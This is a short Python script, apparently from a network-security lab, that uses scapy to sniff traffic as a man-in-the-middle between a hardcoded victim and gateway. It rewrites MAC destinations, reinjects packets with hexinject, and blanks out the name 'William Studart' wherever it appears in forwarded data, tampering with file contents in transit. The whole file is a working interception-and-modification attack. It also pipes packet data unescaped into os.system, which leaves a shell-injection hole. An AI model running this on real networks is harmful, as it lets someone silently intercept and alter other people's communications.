#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.177"
MY_IP = "192.168.1.170"
# gateway is the target
GATEWAY_IP = "192.168.1.176"
#VICTIM_MAC = "### don't want so show###"
MY_MAC = "08:00:27:f2:ee:7c"
#target mac address
GATEWAY_MAC = "08:00:27:8b:4d:60"
#initiator mac address
VICTIM_MAC = "08:00:27:0c:48:c2" 
  
def parse_to_hex(packet):
    # lines below are to redirect hexdump to a file so that we can use in the python script again
    stdout = sys.stdout
    sys.stdout = open('packet.txt', 'w')
    hexdump(packet)
    sys.stdout.close()
    sys.stdout = stdout
    packet_str = open('packet.txt', 'r')
    packet_hex = ''
    #trimming the hexadecimal packet to get only the hexadecimal content
    for line in packet_str:
        hexline = line.split('   ')[1]
        hexline = hexline.replace('  ', ' ')
        packet_hex = packet_hex + ' ' + hexline
    packet_str.close()
    packet_hex = packet_hex.strip()
    return packet_hex

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the target machine
        packet[Ether].dst = GATEWAY_MAC
        packet_hex = parse_to_hex(packet)
        print packet_hex + "----"
        # packets with destination to the target machine are just sent
        os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
    elif (packet[IP].dst == VICTIM_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the initiator machine
        packet[Ether].dst = VICTIM_MAC
        packet_hex = parse_to_hex(packet)
        print packet_hex + "----"
        # if we find "William Studart" in hex in the packet, we modify it to a bunch of espace characters and inject
        if ('57 69 6C 6C 69 61 6D 20 53 74 75 64 61 72 74' in packet_hex):
            packet_hex = packet_hex.replace("57 69 6C 6C 69 61 6D 20 53 74 75 64 61 72 74", "20 20 20 20 20 20 20 20 20 20 20 20 20 20 20")
            print "\n\n\nFOUND THE FILE CONTENT!\n\n\n"
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
        else: # else we just inject the original packet
            os.system("echo '" + packet_hex + "' | hexinject -p -i eth0")
sniff(prn=handle_packet, filter=filter, iface=iface, count=0)
